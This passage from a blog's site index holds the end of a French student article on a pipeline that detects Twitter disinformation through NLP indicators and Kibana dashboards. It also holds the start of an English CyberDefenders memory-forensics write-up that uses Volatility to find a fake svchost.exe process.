et non uniquement leur comportement. Pour cela, certains indicateurs sont plus pertinents que d\u0026rsquo;autres 3. Cette approche comporte deux avantages, elle permet de répondre plus efficacement à l\u0026rsquo;adaptation des acteurs de la désinformation et de construire des solutions indépendantes du réseau social étudié, Twitter étant largement surreprésenté. Plus spécifiquement, le traitement automatique du langage naturel (NLP) ainsi que de l\u0026rsquo;apprentissage non-supervisé sont des outils pertinents 2, 4 et 5.\nObjectif # L\u0026rsquo;objectif du projet est de permettre une détection de la désinformation en ligne. Nous souhaitons, à partir d\u0026rsquo;un jeu de données (dataset), produire des indicateurs qui permettront à un analyste d\u0026rsquo;investiguer et de catégoriser l\u0026rsquo;information. Le processus doit être résilient, rapide, expliquable et produire des informations pertinentes. L\u0026rsquo;analyste disposera alors d\u0026rsquo;un outil qui lui permettra à la fois d\u0026rsquo;avoir une vue globale sur le jeu de données, mais également une vue plus fine si de la manipulation est suspectée.\nA noter que nous ne prenons en compte ni la collecte de données, ni l\u0026rsquo;interprétation de ces dernières. Cela relève d\u0026rsquo;autres défis et nécéssiterait un projet à part entière.\nContraintes # Ce projet se déroulant sur une année scolaire en alternance, la principale contrainte est temporelle. Notre envie initiale était d\u0026rsquo;étendre notre projet jusqu\u0026rsquo;à la collecte de données sur Twitter. Cependant, le rachat du réseau social par Elon Musk nous a impacté. En effet, son changement de politique à l\u0026rsquo;égard de l\u0026rsquo;API Twitter et des jeux de données issus de la plateforme ne nous permettait plus d\u0026rsquo;obtenir de la donnée en temps réel, indispensable à notre projet. Nous avons construit un dataset (jeu de données) contenant de la désinformation mais aussi des tweets légitimes que nous avons assemblés afin de tester notre outil. Ce processus d\u0026rsquo;assemblage est détaillé plus bas dans l\u0026rsquo;article.\nLe dataset # Pour disposer de données, nous avons récolté un dataset qui est utilisé dans la littérature scientifique afin de tester des algorithmes de détection de la désinformation. Ce dataset est imparfait pour notre cas d\u0026rsquo;usage. En effet, il ne contient que des tweets identifiés comme étant issus de campagne de désinformation. Ces tweets sont pour nous du signal ; ce ce que nous devrions détecter. Il nous manque du \u0026ldquo;bruit\u0026rdquo; ; des tweets légitimes.\nPour constituer un dataset qui contient du signal et du bruit, donc plus proche de la réalité, nous avons fusionné deux jeux de données. Le second dataset est issu d\u0026rsquo;une compétition de cybersécurité appellée TRACS. Dans ce tournois auquel certaines personnes de ce groupe ont participé, nous devions identifier des comptes faisant de la désinformation parmi des utilisateurs légitimes. Nous avons enlevé les robots de ce dataset et fusionnés les tweets restants avec notre signal.\nCependant, lors de la fusion, nous avons perdu de l\u0026rsquo;information. En effet, le dataset comportant notre signal dispose de bien plus de données que le second. Par exemple, il contient les dates des tweets, le nombre de followers du compte, etc\u0026hellip; Cela nous a mis face à un choix :\nsoit nous remplissions le dataset bruité avec des données, cela implique un investissement en temps et le risque de le biaiser.\nsoit nous assumons réduire notre socle de données, quitte à passer à côté d\u0026rsquo;indicateurs intéressants. En d\u0026rsquo;autres termes, il s\u0026rsquo;agit de s\u0026rsquo;adapter au dataset qui comporte le moins de données, et à s\u0026rsquo;aligner sur lui.\nNous avons choisi la seconde option, par contrainte de temps, mais aussi pour ne pas empoisonner nos données.\nMéthodologie # De part la nature de notre projet, nous pouvons être ammenés à traiter des volumes de données conséquents. De plus, dans une optique d\u0026rsquo;industrialisation, il est nécessaire que notre processus de traitement des données puisse être mis à l\u0026rsquo;échelle ; c\u0026rsquo;est-à-dire qu\u0026rsquo;il puisse supporter un volume de données plus conséquent sans faillir. La big data est un champ scientifique qui répond à ces contraintes, notre projet s\u0026rsquo;inspire des méthodes utilisées dans cette discipline.\nLe pipeline est une représentation abstraite de notre processus de traitement de données. Il se découpe en 3 étapes :\nhomogénéisation : vérification du type des données, de leur format, suppression e/o ajout de données.\nenrichissement : première phase de calcul dans le but de produire plus de données à partir de celles existantes. Par exemple : nombre de hashtags d\u0026rsquo;un tweet, longueur moyenne des mots\u0026hellip; utilisation d\u0026rsquo;algorithmes de Natural Language Processing (NLP) pour calculer un score de sentiment d\u0026rsquo;un tweet.\nLe score de sentiment est un réel qui est compris entre -1 et +1. -1 étant un tweet considéré comme étant négatif et +1 comme positif. Une phrase positive étant par exemple : \u0026ldquo;Je trouve cette voiture très jolie.\u0026rdquo;. Un score de 0 est une phrase neutre. Attention cependant à l\u0026rsquo;interprétation de cette donnée ; un tweet ironique sera perçu comme positif par l\u0026rsquo;algorithme, alors qu\u0026rsquo;un humain le comprendra comme étant négatif. Par exemple : \u0026ldquo;Monsieur X est un politicien honnête, comme en atteste les nombreuses plaintes contre lui.\u0026rdquo;. De plus, l\u0026rsquo;algorithme que nous avons choisi ne permet d\u0026rsquo;effectuer ce type de calcul que sur de l\u0026rsquo;anglais.\ncorrélation : seconde phase de calcul qui aggrège les données sur les auteurs des tweets et calcule, pour chaque auteurs, un ensemble d\u0026rsquo;indicateurs et leurs dérivées (voir la partie dédiée). Cette étape produit un fichier qui sera directement exploité par l\u0026rsquo;analyste grâce à un outil de visualisation. Elle utilise également de la NLP pour calculer la similarité moyenne des tweets d\u0026rsquo;un auteur. Cet algorithme produit un réel allant de 0, tous les tweets de l\u0026rsquo;auteur sont très différents, à 1, tous les tweets de l\u0026rsquo;auteur sont rigoureusement identiques. Il est important de noter que l\u0026rsquo;algorithme compare le sens des tweets et non une comparaison lettre par lettre. Chaque étape produit un fichier en sortie, qui est réutilisé dans la phase suivante. Détaillons le processus complet sur un petit jeu de données.\nNLP # Cette partie s\u0026rsquo;addresse aux plus curieux en matière de NLP. Elle n\u0026rsquo;est pas nécessaire pour comprendre l\u0026rsquo;article. Nous assumons que vous possédez des notions dans ce domaine.\nNous avons utilisé le packahe Python nltk. Selon la littérature scientifique, il produit des résultats à l\u0026rsquo;état de l\u0026rsquo;art. Nous avions été orientés vers des modèles de type BERT, mais par manque de temps nous n\u0026rsquo;avons pas pu creuser plus avant les modèles. Nous avons choisi une technologie simple et rapide à implémenter. De plus, cette librairie permet de faire de l\u0026rsquo;analyse de sentiment, ainsi qu\u0026rsquo;un calcul de similarité.\nQue ce soit pour l\u0026rsquo;analyse de sentiment ou le calcul de similarité, le processus comporte plusieurs étapes :\ntokenisation : découpage du texte en \u0026ldquo;token\u0026rdquo;, à peu près équivalent à des mots.\napplication des \u0026ldquo;stop words\u0026rdquo; : suppression des mots non impactants sémantiquement (déterminants, prépositons\u0026hellip;).\nlemmatisation : réduction des mots à leur sens strict (exemple : \u0026ldquo;mangeons\u0026rdquo; va devenir \u0026ldquo;manger\u0026rdquo;).\nréassemblage des tokens en textes.\napplication de l\u0026rsquo;algorithme de NLP.\nPour le calcul de similarité, nous calculons la matrice de similarité cosinus à partir des vecteurs TF-IDF. Ces méthodes sont également utilisés en fouilles de texte par des moteurs de recherche pour évaluer l\u0026rsquo;importance de termes dans un corpus. Voici le code que nous utilisons, certaines fonctions sont issues du package nltk :\nsimilarity_matrix = cosine_similarity(tfidf_matrix) # average similarity processing similarity_score = similarity_matrix.sum() / (similarity_matrix.shape[0] * (similarity_matrix.shape[0])) # reduce RAM usage del similarity_matrix del tfidf_matrix del tokenized_contents Afin de réduire l\u0026rsquo;usage de la RAM, nous supprimons certaines variables lourdes pour être sûr de libérer de la mémoire vive. Nous avons mesuré une baisse significative (plusieurs gigas de RAM en moins pour un dataset en entrée de 160Mo) de l\u0026rsquo;usage de la RAM suite à cette action. Cependant, de véritables tests doivent être menés afin de juger de la pertinance des trois dernières lignes.\nExemple # Voici notre dataset qui regroupe trois tweets de deux utilisateurs différents. En réalité, le dataset en entrée contient plus de données mais tous les champs ne sont pas utilisés (voir la section précédente). Par simplification, nous ne montrons que les données utilisées par l\u0026rsquo;outil.\nauthor,content,language 10_GOP,\u0026#34;\u0026#34;\u0026#34;We have a sitting Democrat US Senator on trial for corruption and you\u0026#39;ve barely heard a peep from the mainstream media.\u0026#34;\u0026#34; ~ @nedryun https://t.co/gh6g0D1oiC\u0026#34;,English 10_GOP,\u0026#34;\u0026#34;\u0026#34;We have a currently serving Democratic US senator facing corruption charges, yet there has been minimal coverages of it in the mainstream media.\u0026#34;\u0026#34; ~ @nedryun https://t.co/gh6g0D1oiC\u0026#34;,English sonataz45,\u0026#34;\u0026#34;\u0026#34;Just witnessed the most breathtaking sunset. Nature\u0026#39;s artwork never fails to amaze me. #NatureBeauty #SunsetMagic\u0026#34;\u0026#34;\u0026#34;,English L\u0026rsquo;homogénéisation ne produit aucun changement. Dans un cas réel, il aurait traduit toutes les dates dans un même format, remplit certains champs laissés vides, etc\u0026hellip; Cette première étape est facultative pour notre projet mais est nécessaire si on souhaite élargir les sources de données et leurs traitemens postérieurs.\nL\u0026rsquo;enrichissement est plus intéressants :\nauthor,content,language,number_of_words,tweet_length,number_of_url,get_number_of_hashtags,sentiment_score 10_GOP,\u0026#34;\u0026#34;\u0026#34;We have a sitting Democrat US Senator on trial for corruption and you\u0026#39;ve barely heard a peep from the mainstream media.\u0026#34;\u0026#34; ~ @nedryun https://t.co/gh6g0D1oiC\u0026#34;,English,24,156,1,0,0.0 10_GOP,\u0026#34;\u0026#34;\u0026#34;We have a currently serving Democratic US senator facing corruption charges, yet there has been minimal coverages of it in the mainstream media.\u0026#34;\u0026#34; ~ @nedryun https://t.co/gh6g0D1oiC\u0026#34;,English,26,181,1,0,0.0 sonataz45,Just witnessed the most breathtaking sunset. Nature\u0026#39;s artwork never fails to amaze me. #NatureBeauty #SunsetMagic,English,15,113,0,2,0.3574 Plusieurs champs ont été ajoutés :\nnumber__of_words : le nombre de mot que contient le tweet.\ntweet_length : le nombre total de caractère que contient le tweet.\nnumber__of_url : le nombre d\u0026rsquo;url que contient le tweet.\nget__number__of_hashtags : le nombre d\u0026rsquo;ashtags que contient le tweet.\nsentiment_score : le score de sentiment (compris entre -1 et 1), expliqué plus haut dans l\u0026rsquo;article.\nCette étape ajoute de la donnée à ce qui existe déjà. Les données vont ensuite être regroupées par auteur et des calculs statistiques vont être effectués, c\u0026rsquo;est la corrélation. Les données ci-dessous sont difficilement lisibles, notez seulement qu\u0026rsquo;elles seront ensuite utilisées par l\u0026rsquo;outil de visualisation.\nauthor,rewteet_sum,retweet_mean,number_of_words_sum,number_of_words_mean,number_of_words_min,number_of_words_max,number_of_words_std,language_count,number_of_hashtags_sum,number_of_hashtags_mean,number_of_hashtags_min,number_of_hashtags_max,number_of_hashtags_std,number_of_url_sum,number_of_url_mean,number_of_url_min,number_of_url_max,number_of_url_std,tweet_length_sum,tweet_length_mean,tweet_length_min,tweet_length_max,tweet_length_std,url_by_words_sum,url_by_words_mean,url_by_words_min,url_by_words_max,url_by_words_std,message_similarity_mean,message_similarity_min,message_similarity_max,message_similarity_std,sentiment_score_mean,sentiment_score_std 10_GOP,0,0.0,50,25.0,24,26,1.4142135623730951,1,0,0.0,0,0,0.0,2,1.0,1,1,0.0,337,168.5,156,181,17.67766952966369,0.08012820512820512,0.04006410256410256,0.038461538461538464,0.041666666666666664,0.002266367888418416,0.6754878323160571,0.6754878323160571,0.6754878323160571,0.0,0.0,0.0 sonataz45,0,0.0,15,15.0,15,15,,1,2,2.0,2,2,,0,0.0,0,0,,113,113.0,113,113,,0.0,0.0,0.0,0.0,,1.0000000000000007,1.0000000000000007,1.0000000000000007,,0.3574, C\u0026rsquo;est ici que rentrent en jeu les indicateurs. En effet, nous avons extraits de la littérature scientifique les indicateurs pertinents pour de la détection de manipulation de l\u0026rsquo;information, par rapport aux données dont nous disposions. Ces indicateurs sont les suivants :\nretweet : est-ce que le tweet est un retweet (réponse à un tweet) ou non.\nnumber__of_words : voir au-dessus.\nlanguage_count : le nombre de langage différents utilisés par un compte.\nnumber__of_hashtags : voir au-dessus.\nnumber__of_url : voir au-dessus.\ntweet_lenght : voir au-dessus.\nurl__by_words : fréquence des urls dans les tweets d\u0026rsquo;un compte.\nmessage_similarity : similarité des messages d\u0026rsquo;un compte.\nsentiment_score : voir au-dessus.\nPour chaque indicateurs, nous avons calculés :\nla somme\nla moyenne\nle minimum\nle maximum\nl\u0026rsquo;écart-type : indique si les données sont homogènes ou dispersées par rapport à la moyenne.\nVisualisation # La visualisation est l\u0026rsquo;étape finale qui permettra à un analyste d\u0026rsquo;investiguer et de conclure à une éventuelle manipulation de l\u0026rsquo;information. Pour cette étape, nous avons choisi la suite ELK, qui est un logiciel qui permet l\u0026rsquo;ingestion, le traitement, l\u0026rsquo;indexation et l\u0026rsquo;affichage de larges volumes de données.\nCette suite comporte plusieurs outils mais seul Kibana (visualisation) est important ici. Ce logiciel permet de construire des tableaux de bords dynamiques. La majeure partie du travail consiste à construire une représentation pertinente, intuitive et non biaisée. Nous avons pu construire des tableaux de bords rudimentaires que nous vous partageons ici. Une exploration plus approfondie des résultats est à prévoir afin de déterminer la pertinence de nos indicateurs par rapport au jeu de données.\nL\u0026rsquo;objectif de la visualisation est double : elle doit permettre à la fois de dresser rapidement un portrait global du dataset, mais aussi d\u0026rsquo;être plus fin pour lever des doutes et/ou de comprendre comment la manipulation de l\u0026rsquo;information s\u0026rsquo;organise et qui en sont les auteurs.\nApproche globale et visuelle # Une représentation graphique implique une compréhension plus aisée au détriement d\u0026rsquo;une perte d\u0026rsquo;information. Nous avons choisi de représenter l\u0026rsquo;utilisation des langues dans le dataset. Kibana propose une gamme variée de représentation graphique, cette balance entre approximation et visualisation est à garder en tête.\nReprésentation des utilisateurs les plus polyglottes. Chaque rectangle est un utilisateur dont la taille est proportionnelle aux nombres de langues parlées. Cette représentation est intéressante ; on comprend que nous sommes en présence de comptes qui parlent beaucoup de langues (rectangles les plus gros). En passant le curseur sur un rectangle, on obtient le nombre de langues parlées (42 pour le rectangle tout en haut à gauche) et son pseudo. Les rectangles situés vers le bord en bas à droite sont des utilisateurs qui n\u0026rsquo;utilisent qu\u0026rsquo;une seule langue dans tous leurs tweets. Des utilisateurs avec de nombreuses langues parlées peuvent être des acteurs de la désinformation.\nCependant, il ne serait pas prudent de les classer comme tels à partir de ce seul indicateur mais cela n\u0026rsquo;est pas la vocation d\u0026rsquo;une représentation globale. Une investigation plus fine est à prévoir lorsque cette première étape remonte des informations intéressantes.\nApproche fine sur un indicateur : l\u0026rsquo;utilisation des hashtags # Nous avons construit un dashboard centré sur les hashtags. Il est également possible de construire les mêmes visualisations sur d\u0026rsquo;autres indicateurs.\nTableau de bord centré sur les hashtags. Nous souhaitons que l\u0026rsquo;analyste ait une vue globale rapidement. C\u0026rsquo;est pourquoi nous avons coloré en rouge (la couleur est indépendante de la valeur) trois cases. De gauche à droite : l\u0026rsquo;écart-type (ET) de la somme des hashtags de chaque compte, l\u0026rsquo;ET du nombre moyen d\u0026rsquo;hashtags par compte et l\u0026rsquo;ET de l\u0026rsquo;ET des hashtags pour chaque compte. En d\u0026rsquo;autres termes, ces données nous indiquent la disparité de l\u0026rsquo;utilisation des hashtags par les utilisateurs de notre dataset.\nDes chiffres importants, comme c\u0026rsquo;est le cas ici, indiquent que des comptes utilisent beaucoup de hashtags, tandis que d\u0026rsquo;autres en utilisent peu. Par exemple la case en bas à gauche montre un ET de 114 366% il y a donc des comptes qui utilisent énormément plus de hashtags que d\u0026rsquo;autres. Cependant, cet indicateur n\u0026rsquo;est pas suffisant car on peut imaginer des comptes automatiques mais pour autant légitimes (information en continue par exemple) qui twitteraient beaucoup en utilisant des hashtags. Pour équilibrer cet indicateur, on peut regarder celui à sa droite qui renseigne sur la proportion de hashtags par tweet. On observe un ET de 40% qui suggère que des comptes utilisent plus de hashtags par tweets que d\u0026rsquo;autres.\nEnfin, le graphique nous indique les utilisateurs les plus prolifiques en utilisation d\u0026rsquo;hashtags. C\u0026rsquo;est en quelque sorte une équivalence graphique de la partie gauche du tableau de bord. On observe effectivement que quelques comptes sont à l\u0026rsquo;origine de la plupart des hashtags. On peut également obtenir les pseudos des comptes. Kibana offre la possibilité de cliquer sur un pseudo pour obtenir des informations qui lui sont propres. Ainsi, avec un dashboard adapté, il serait possible d\u0026rsquo;investiguer directement, à partir d\u0026rsquo;un seul dashboard, sur un compte précis.\nCe dashboard est un exmple pour un seul indicateur. Un tableau de bord global, qui regrouperait les indices les plus pertinents pour tous les indicateurs, serait utile à un analyste. Un travail reste à effectuer pour choisir les données à afficher.\nEvaluation de nos résultats # Les représentations précédentes se basent sur le dataset mixé (signal + bruit) qui correspondrait à un cas réel. Pour évaluer la pertinence de nos indicateurs, nous avons envoyé à Kibana trois datasets :\nle dataset qui contient uniquement des tweets identifiés comme étant à l\u0026rsquo;origine de campagne de désinformation : le signal (colonne de gauche).\nle dataset cas réel qui comporte le signal et le bruit (colonne du milieux).\nle dataset qui contient uniquement le bruit, donc des tweets légitimes (colonne de droite).\nNous avons construit un tableau de bord pour évaluer certains indicateurs.\nComparaison entre les trois datasets. Cette représentation est pour nous la plus intéressante car elle permet de critiquer les indicateurs :\nle nombre de langues utilisées semblent être très discriminant, les comptes légitimes ayant plutôt tendance à parler une ou deux langues, alors que ceux qui pratiquent la désinformation sont bien plus hauts, jusqu\u0026rsquo;à 40 langues différentes.\nla similarité des messages est trois fois plus élevée lorsqu\u0026rsquo;il s\u0026rsquo;agit de comptes illégitimes.\nle nombre médian de hashtags est plus de deux fois plus élevé lorsqu\u0026rsquo;il s\u0026rsquo;agit de comptes illégitimes. Cependant, cela ne se reflètent pas lorsque des comptes légitimes sont présents. Cet indicateur est donc à raffiner.\nil en est de même pour la présence des URLs. Cela semble être un indicateur très pertinent (facteur 10 entre compte légitimes et illégitimes) mais qui ne se reflète pas beaucoup dans le dataset final. Il semble être prometteur mais est à affiner.\nle nombre de mot est peut-être pertinent, on observe une petite différence : 11.594 pour le dataset signal contre 13.211 pour le bruit. Il faudrait explorer plus avant cet indicateur pour savoir si cet écart est significatif.\nle sentiment global semble être pertinent, les comptes illégitimes tendent à être moins positifs que les comptes légitimes. On notera que les comptes légitimes ont tendance à être plutôt positifs.\nles tweets sont en moyenne plus longs pour les comptes illégitimes.\nles comptes illégitmes utilisent en moyenne dix fois plus d\u0026rsquo;URLs par mots que les comptes légitimes.\nCette approche comparative, bien qu\u0026rsquo;imparfaite de part la construction de notre dataset \u0026ldquo;cas réel\u0026rdquo;, montre plusieurs choses :\ncertains indicateurs semblent être discriminants pour différencier un dataset contenant de la manipulation d\u0026rsquo;un dataset n\u0026rsquo;en contenant pas.\ncertains indicateurs semblent pouvoir être utilisés pour discriminer un compte plutôt qu\u0026rsquo;un dataset.\nune représentation graphique bien choisie peut faire gagner un temps précieux à un analyste.\nil serait intéressant d\u0026rsquo;entraîner un modèle de machine learning sur ces données qui classerait les comptes selons s\u0026rsquo;ils sont identifiés comme légitimes ou non. Ainsi, on pourrait construire la heat map de ce modèle et la comparer avec les résultats ci-dessus. De nouveaux indicateurs pourraient émerger.\nComparaison par rapport à une approche \u0026ldquo;à la main\u0026rdquo; # Nous supposons que l\u0026rsquo;analyste va rechercher les mêmes indicateurs que nous en suivant une méthode similaire. L\u0026rsquo;outil dont il dispose est un interpréteur Python (ou autre langage de scripting haut niveau) avec des librairies adaptées telles que Pandas, Matplotlib et Nltk. Ce sont les librairies que nous avons utilisées. L\u0026rsquo;analyste débute avec un dataset bruité et potentiellement hétérogène.\nLa première étape, et la plus laborieuse, est d\u0026rsquo;homogénéiser ces données. Il va donc ouvrir le fichier, supprimer les colonnes qui ne lui seront pas utiles, modifier le format de certaines données\u0026hellip; Cette étape est obligatoire, même pour notre outil, comme on ne peut pas prévoir les données qui seront envoyées.\nLa seconde étape consiste à enrichir la données. Pour cela l\u0026rsquo;analyste va de nouveau utiliser Pandas ou adopter une approche plus naïve et sensiblement plus longue s\u0026rsquo;il ne maîtrise pas l\u0026rsquo;outil. De même, s\u0026rsquo;il ne maîtrise pas les concepts de NLP, l\u0026rsquo;utilisation de Nltk peut être difficile et produire des résultats incorrects si le pre-processing n\u0026rsquo;est pas effectué correctement.\nEnsuite, il va devoir corréler les données et les aggréger sur les auteurs. Sans Pandas, cela sera long et fastidieux, surtout pour calculer les indicateurs et leurs statistiques (moyenne, écart-type,\u0026hellip;).\nL\u0026rsquo;étape suivante est de définir une visualisation pertinente des données. Enfin, il pourra visualiser ses résultats grâce à Matplotlib ou un autre outil, comme Kibana.\nCette approche \u0026ldquo;à la main\u0026rdquo; montre que notre outil est pertinent. En effet, l\u0026rsquo;approche est laborieuse, longue, nécessite un travail de réflexion en amont sur la structure des données et suppose des connaissances dans plusieurs domaines. Notre outil permet de gagner du temps pour se concentrer l\u0026rsquo;investigation. Avec une solution de visualisation clef en main (modèles de dashboards pré-conçus), notre outil deviendrait encore plus avantageux par rapport à une approche à la main. Nous discutons de cet axe d\u0026rsquo;amélioration dans la partie suivante.\nPerspectives d\u0026rsquo;amélioration # Dans le but d\u0026rsquo;obtenir un outil complet, il faut pouvoir récolter la donnée. C\u0026rsquo;est aujourd\u0026rsquo;hui un facteur limitant, aussi car la qualité de la donnée influe directement sur la pertinence de nos résultats. Une collecte de donnée automatique sur des thématiques précises améliorerait la détection de campagne de désinformation. Cette donnée peut être issue de Twitter ou non. Une collecte de données hors Twitter impliquerait une refonte de nos scripts et l\u0026rsquo;élaboration d\u0026rsquo;une nouvelle base sur les données ingérées par l\u0026rsquo;outil. Cependant, les campagnes de désinformations ayant tendance à emmener les utilisateurs vers d\u0026rsquo;autres réseaux, une collecte plus large permettra de mieux comprendre les méthodes de manipulation.\nDe plus, la NLP ne s\u0026rsquo;occupant que de l\u0026rsquo;anglais, le support d\u0026rsquo;autres langues élargirait le périmètre de l\u0026rsquo;outil. Une nouvelle étude des modèle supportant et reconnaissant d\u0026rsquo;autres langages est à prévoir.\nEtant donnée la difficulté et la qualité des datasets disponibles en ligne, un travail d\u0026rsquo;expérimentation avec des algorithmes d\u0026rsquo;apprentissage non-supervisé est à prévoir 2.\nEnfin, un travail sur la visualisation de donnée est obligatoire pour améliorer l\u0026rsquo;analyse. Nous avons construit des affichages rudimentaires qui permettent d\u0026rsquo;obtenir un premier apperçu mais qui sont perfectibles. Une meilleur visualisation permettra une meilleure analyse. Ce travail doit être mené avec précaution pour éviter les biais et les mauvaises interprétations des résultats.\nRemerciements # Nous tenons à remercier notre professeur encadrant, M Guillet qui nous a accompagné tout au long de cette année. Il nous a permis de remettre en question certains de nos choix et à fait preuve d\u0026rsquo;exigence à notre égard. Nous tenons également à remercier chaleureusement l\u0026rsquo;équipe d\u0026rsquo;expert de la DGA-MI qui a eu la gentillesse de prendre le temps de nous recevoir pour répondre à nos questions. Ce projet n\u0026rsquo;aurait pas la même saveur sans toutes les personnes qui nous ont accompagnées.\nBibliographie # 1. Islam, Md Rafiquel, Shaowu Liu, Xianzhi Wang, and Guandong Xu. n.d. “Deep learning for misinformation detection on online social networks: a survey and new perspectives.” Springer. 10.1007/s13278-020-00696-x. 2. Orabi, Mariam, Djedjiga Mouheb, Zaher Al Aghbari, and Ibrahim Kamel. 2020. “Detection of Bots in Social Media: A Systematic Review.” 10.1016/j.ipm.2020.102250. 3. Tuna, Tayfun, Esra Akbas, Ahmet Aksoy, Muhammed Abdullah Canbaz, Umit Karabiyik, Bilal Gonen, and Ramazan Aygun. 2016. “User characterization for online social networks.” 10.1007/s13278-016-0412-3. 4. Alonso, Miguel, David Vilares, Carlos Gomes-Rodriguez, and Jesus Vilares. 2021. “Sentiment Analysis for Fake News Detection.” 10.3390/electronics10111348. 5. Nausheen, Farha, and Sayyada Hajera Begum. 2018. “Sentiment Analysis to Predict Election Results Using Python.” 10.1109/icisc.2018.8399007. Ressources additionnelles # L. Linvill, Darren, and Patrick L. Warren. 2018. “Troll Factories: The Internet Research Agency and State-Sponsored Agenda Building.” https://www.davidpuente.it/blog/wp-content/uploads/2018/08/Linvill_Warren_TrollFactory.pdf.\nShu, Kai, Amy Sliva, Suhang Wang, Jiliang Tang, and Huan Liu. 2017. “Fake News Detection on Social Media: A Data Mining Perspective.” 10.1145/3137597.3137600.\nContact # Si notre projet vous intéresse ou que vous avez des questions ou remarques, n\u0026rsquo;hésitez pas à nous contacter via cette adresse mail. Nous essaierons de vous répondre rapidement : contact.netcheck@gmail.com\n","date":"10 juillet 2023","permalink":"/posts/automatiser-la-detection-de-la-manipulation-de-linformation-en-cas-reel/","section":"Mes articles","summary":"Nathan DUNAND (auteur) - Jean SEVAUX - Clément LAISNÉ - Corentin HUVELIN","title":"Automatiser la détection de la manipulation de l'information en cas réel"},{"content":"This is my proposed solution for the cyberdefenders’s challenge NintendoHunt (difficult) published on April 27, 2023.\nThe scenario :\nYou have been hired as a digital forensics investigator to investigate a potential security breach at a small company. The company has recently noticed unusual network activity and suspects that there may be a malicious process running on one of their computers. Your task is identifying the malicious process and gathering information about its activity.\nTools:\nVolatility 2 Q1 What is the process ID of the currently running malicious process? # First of all, I have to retrieve the profile to use with this dump :\n$ vol.py -f memdump.mem imageinfo Instantiating KDBG using: Unnamed AS Win10x64_17134 (6.4.17134 64bit) Note that this command takes severals minutes, maybe because of the dump size (5.4Go)? One of the profile found is Win10x64_1713.\nMy first approach was to look the processes :\n$ vol.py -f memdump.mem --profile=Win10x64_17134 (pslist and psscan) We could see a lot of processes and svchost.exe. But none obvious malicious file. The second part of the question was a little bit tricky for me, as I\u0026rsquo;m not familiar with Windows native process tree (svchost, explorer, dllhost and stuff). I got stuck for a while and I solved the question without follow the hint. A Cyberdefender\u0026rsquo;s member gave me a tips:\nSearch about the most abusable process by the hackers\nI made several challenges with svchost.exe abuse so let\u0026rsquo;s investigate on it. According to this site : Windows Processes - HackTricks:\nThere will be several processes of svchost.exe. If any of them is not using the -k flag, then that\u0026rsquo;s very suspicious. If you find that services.exe is not the parent, that\u0026rsquo;s also very suspicious.\nI investigate on command lines with cmdline plugin:\n$ vol.py -f memdump.mem --profile=Win10x64_17134 cmdline ... svchost.exe pid: 7260 Command line : C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC ************************************************************************ svchost.exe pid: 8560 Command line : \u0026#34;C:\\Windows\\svchost.exe\u0026#34; ... This plugin shows that process #8560 was launched in a very unusual way. This could be enough to tag it as malicious, but let\u0026rsquo;s dig again:\n$ vol.py -f memdump.mem --profile=Win10x64_17134 psscan|grep svchost 0x0000a780001d6080 svchost.exe 5048 804 0x000000003c400002 2018-08-01 19:21:00 UTC+0000 0x0000c20c6a5514c0 svchost.exe 8808 804 0x0000000079000002 2018-08-06 18:12:05 UTC+0000 0x0000c20c6aa0d580 svchost.exe 8052 804 0x00000000a5c09002 2018-08-06 18:12:40 UTC+0000 ... 0x0000c20c6d5ac340 svchost.exe.ex 5528 4824 0x0000000119400002 2018-08-01 19:52:20 UTC+0000 2018-08-01 19:52:20 UTC+0000 0x0000c20c6d63e080 svchost.exe 9388 804 0x000000002be00002 2018-08-06 18:11:49 UTC+0000 0x0000c20c6d6fc580 svchost.exe 10012 4824 0x0000000136200002 2018-08-01 19:49:19 UTC+0000 2018-08-01 19:49:19 UTC+0000 0x0000c20c6d82e080 svchost.exe 1404 4824 0x00000000a0f00002 2018-08-01 19:54:55 UTC+0000 2018-08-01 19:56:35 UTC+0000 0x0000c20c6d99b580 svchost.exe.ex 8140 4824 0x00000000b8600002 2018-08-01 19:52:16 UTC+0000 2018-08-01 19:52:16 UTC+0000 0x0000c20c6dbc5340 svchost.exe 7852 4824 0x000000003ff00002 2018-08-01 19:49:21 UTC+0000 2018-08-01 19:49:22 UTC+0000 ... Some of svchost process are linked with PPID 804 (services.exe) or PPID #4824 (explorer.exe). A svchost in Windows must have a services process as parent. Let\u0026rsquo;s filter on theses processes:\n$ vol.py -f memdump.mem --profile=Win10x64_17134 psscan|grep -E \u0026#39;svchost.*4824\u0026#39; 0x0000c20c6ab2b580 svchost.exe.ex 6176 4824 0x000000004d100002 2018-08-01 19:52:19 UTC+0000 2018-08-01 19:52:19 UTC+0000 0x0000c20c6ab70080 svchost.exe 8852 4824 0x0000000096f00002 2018-08-01 19:59:49 UTC+0000 2018-08-01 20:00:08 UTC+0000 0x0000c20c6d5ac340 svchost.exe.ex 5528 4824 0x0000000119400002 2018-08-01 19:52:20 UTC+0000 2018-08-01 19:52:20 UTC+0000 0x0000c20c6d6fc580 svchost.exe 10012 4824 0x0000000136200002 2018-08-01 19:49:19 UTC+0000 2018-08-01 19:49:19 UTC+0000 0x0000c20c6d82e080 svchost.exe 1404 4824 0x00000000a0f00002 2018-08-01 19:54:55 UTC+0000 2018-08-01 19:56:35 UTC+0000 0x0000c20c6d99b580 svchost.exe.ex 8140 4824 0x00000000b8600002 2018-08-01 19:52:16 UTC+0000 2018-08-01 19:52:16 UTC+0000 0x0000c20c6dbc5340 svchost.exe 7852 4824 0x000000003ff00002 2018-08-01 19:49:21 UTC+0000 2018-08-01 19:49:22 UTC+0000 0x0000c20c6ddad580 svchost.exe 8560 4824 0x00000000b2200002 2018-08-01 20:13:10 UTC+0000 We were able to see that PID #8560 is running, which is an important point in relation to the question, and that it is the same suspiciously launched process (see above). Here it is our malicious process.\nQ2 What is the md5 hash hidden in the malicious process memory? # Dump the malicious process in order to explore its memory. As the process seems hidden you have to put the offset (available in pslist, pscan or psxview):\n$ vol.py -f memdump.mem --profile=Win10x64_17134 memdump -p 8560 --dump-dir 8560 --offset=0x0000000084551580 Writing svchost.exe [ 8560] to 8560.dmp # let\u0026#39;s search for md5 hash $ strings 8560/8560.dmp|grep -Ei \u0026#39;(hash|md5)|[a-fA-F0-9]{31}\u0026#39; # too much results!!! There is too much strings and none of them seems to be the flag. Maybe the approach is not the good one so let\u0026rsquo;s try to extract the raw strings and look for something interesting:\n$ strings 8560/8560.dmp \u0026gt; 8560_raw_strings $ cat 8560_raw_strings ... s\u0026#34;: \u0026#34;auto_complete\u0026#34;: { \u0026#34;selected_items\u0026#34;: [ ] }, \u0026#34;buffers\u0026#34;: [ { \u0026#34;contents\u0026#34;: 